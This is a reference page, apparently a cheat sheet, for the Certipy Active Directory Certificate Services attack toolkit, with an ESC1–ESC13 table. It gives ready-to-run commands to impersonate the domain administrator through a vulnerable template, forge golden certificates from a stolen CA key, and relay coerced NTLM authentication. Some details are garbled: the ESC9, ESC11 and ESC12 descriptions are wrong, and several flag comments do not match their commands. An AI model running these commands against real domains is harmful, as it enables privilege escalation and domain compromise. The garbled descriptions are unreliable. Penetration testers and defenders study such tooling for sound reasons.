# Certipy — AD CS Exploitation Toolkit

Python-based tool for enumerating and exploiting misconfigurations in Active Directory Certificate Services (AD CS). Covers ESC1 through ESC13 attack paths with built-in authentication, certificate request, and PKI abuse logic.

## How It Works

Certipy interacts with AD CS endpoints via RPC (ICertRequest, ICertAdmin) and Web Enrollment (CES/SCEP). It automates the full certificate abuse lifecycle:

**Attack flow:**
1. **Enumerate** — discover CAs, certificate templates, enrollment rights, and misconfigurations
2. **Request** — authenticate (password, NT hash, Kerberos, PEM key) and request vulnerable certificates
3. **Authenticate** — use stolen certificates for PKINIT authentication (`schannel` → TGT)
4. **Forge** — golden certificate attacks against CA private keys

**ESCs covered:**

| Vector | Description |
|--------|-------------|
| **ESC1** | Template allows SAN specification + enrollee supplies SAN + manager approval off + authorized signatures not required |
| **ESC2** | Template allows Any Purpose EKU (or no EKU) → can be used for anything |
| **ESC3** | Template has Enrollment Agent EKU → chain to request on behalf of another principal |
| **ESC4** | Attacker has WriteOwner/WriteDACL on a template → modify to ESC1 and exploit |
| **ESC5** | Vulnerable CA security descriptor — attacker modifies CA settings |
| **ESC6** | EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA — any template becomes vulnerable |
| **ESC7** | CA Access Control — attacker has ManageCA and/or ManageCertificates rights |
| **ESC8** | NTLM relay to AD CS Web Enrollment endpoint (HTTP) |
| **ESC9** | No Security Extension + Weak Enrollment Agent Authentication |
| **ESC10** | No Security Extension + Weak Client Authentication |
| **ESC11** | ICERTREQUESTRELOCATION allows NTLM relay with RPC |
| **ESC12** | CA publishes template with weak SID and strong EKU → SAN injection |
| **ESC13** | Template maps to a group via issuance policies → group membership escalation |

## Manual

### Enumeration

```bash
# Enumerate CA(s), templates, and misconfigurations
certipy find -u user@domain.local -p 'Password!' -dc-ip 10.0.0.1

# Save output to JSON file
certipy find -u user@domain.local -p 'Password!' -dc-ip 10.0.0.1 -stdout -vulnerable

# Enumerate only vulnerable templates
certipy find -u user@domain.local -p 'Password!' -dc-ip 10.0.0.1 -vulnerable

# BloodHound-compatible output (for ingestion)
certipy find -u user@domain.local -p 'Password!' -dc-ip 10.0.0.1 -bloodhound
```

### Request Certificate (ESC1, ESC3, etc.)

```bash
# Request certificate with SAN as another user (ESC1)
certipy req -u user@domain.local -p 'Password!' -ca 'CA-SERVER\CA-NAME' \
  -template VulnTemplate -upn administrator@domain.local

# Output: administrator.pfx (PFX certificate with private key)
```

### Authenticate with Certificate

```bash
# Get TGT from certificate
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1

# Get NT hash from certificate
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1 -ptt

# Request TGT and inject into current session (Windows)
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1 -ptt -username administrator
```

### Golden Certificate

```bash
# Extract CA private key (need elevated access on CA server)
certipy ca -backup -u admin@domain.local -p 'Password!' -ca 'CA-SERVER\CA-NAME'
# Output: CA.pfx + private key

# Forge golden certificate for any user
certipy forge -ca-pfx CA.pfx -upn administrator@domain.local -subject "CN=Administrator,CN=Users,DC=domain,DC=local"

# Authenticate with forged certificate
certipy auth -pfx forged_admin.pfx -dc-ip 10.0.0.1
```

### ESC8 — NTLM Relay to AD CS

```bash
# Set up relay (attacker machine)
certipy relay -ca 10.0.0.2

# Coerce target to authenticate to relay (separate terminal)
# PetitPotam, Coercer, or PrintBug against target DC/server
dementor.py -d domain.local -u user -p 'Password!' 10.0.0.3 10.0.0.4
```

## Build

```bash
git clone https://github.com/ly4k/Certipy.git
cd Certipy
pip install .
```

## Install

```bash
# Pip
pip install certipy-ad

# From source
pip install git+https://github.com/ly4k/Certipy.git

# Virtualenv recommended
python -m venv venv
source venv/bin/activate
pip install certipy-ad
```

## Package

| Manager | Command |
|---------|---------|
| pip | `pip install certipy-ad` |
| Source | `pip install git+https://github.com/ly4k/Certipy.git` |

## Links

| Resource | URL |
|----------|-----|
| GitHub | https://github.com/ly4k/Certipy |
| PyPI | https://pypi.org/project/certipy-ad/ |
| AD CS attack reference | https://posts.specterops.io/certified-pre-owned-d95910965cb2 |
| ESC13 | https://posts.specterops.io/introducing-esc13-d532fd0d0d09 |
| ESC9/ESC10 | https://github.com/ly4k/Certipy/releases |
